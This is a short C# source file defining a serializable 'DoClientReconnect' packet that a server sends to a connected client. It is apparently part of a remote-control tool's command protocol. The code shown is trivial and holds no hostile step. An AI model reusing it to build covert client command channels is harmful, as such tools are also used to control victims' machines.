using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoClientReconnect : IPacket
    {
        public DoClientReconnect()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}